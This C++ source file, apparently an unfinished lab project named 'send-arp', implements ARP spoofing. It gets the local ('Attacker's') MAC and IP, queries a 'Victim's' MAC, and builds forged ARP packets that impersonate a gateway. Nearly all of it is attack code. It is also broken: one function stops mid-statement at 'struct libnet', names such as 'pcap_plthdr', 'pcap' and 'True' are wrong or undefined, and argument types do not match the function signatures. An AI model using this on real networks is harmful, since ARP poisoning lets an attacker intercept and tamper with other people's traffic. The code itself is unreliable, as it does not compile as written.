#include "send-arp.h"

int		_get_my_mac(t_info *Info, char *ifc)
{
	struct ifreq		data;
	int					fd;

	fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(data.ifr_name, ifc);

    if (!ioctl(fd, SIOCGIFHWADDR, &data))
		Info->mac = Mac((uint8_t *)data.ifr_hwaddr.sa_data);
	else
		return (1);
	if (!ioctl(fd, SIOCGIFADDR, &data))
		Info->ip = Ip(ntohl(((struct sockaddr_in*)&data.ifr_addr)->sin_addr.s_addr));
	else
		return (1);
	
	printf("[info] Attacker's Mac Address	: %s\n", std::string(Info->mac).data());
	printf("[info] Attacker's IP Address	: %s\n", std::string(Info->ip).data());

	close(fd);
	return (0);
}

int		_get_victim_mac(pcap_t *handle, t_info *Victim, t_info *Attacker)
{
	_send_arp_packet(handle, 0, Victim, Attacker, Attacker, Victim);
	while (True)
	{
		struct pcap_plthdr *header;
		const u_char *packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0)
			continue ;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

	struct libnet_ethernet_hdr *eth_hdr = (struct libnet_ethernet_hdr *)packet;
	if (ntohs(eth_hdr -> ether_type) != ETHERTYPE_ARP)
		continue ;
	struct libnet

	}
}

int		_send_arp_packet(pcap *handle, int opcode, t_info Dest, t_info Src, t_info Sender, t_info Target)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = Dest.mac;                           //Victim's Mac address
	packet.eth_.smac_ = Src.mac;							//Attacker's Mac address (my)
	packet.eth_.type_ = htons(EthHdr::Arp);

	if (opcode == 0)
		packet.arp_.op_ = htons(ArpHdr::Request);
	else if (opcode == 1)
		packet.arp_.op_ = htons(ArpHdr::Reply);
	else
	{
		printf("[Error] Arp Opcode Error\n");
		return (1);
	}

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.smac_ = Mac(Sender.mac);					//Victim's Mac address
	packet.arp_.sip_ = htonl(Sender.ip);					//Victim's IP address
	packet.arp_.tmac_ = Mac(Target.mac);					//Attacker's Mac address
	packet.arp_.tip_ = htonl(Target.ip);                    //Target(Gateway)'s IP address

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0)
	{
			fprintf(stderr, "[Error] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return (1);
	}

	printf("[ARP] Send packet Complete\n");

	return (0);
}
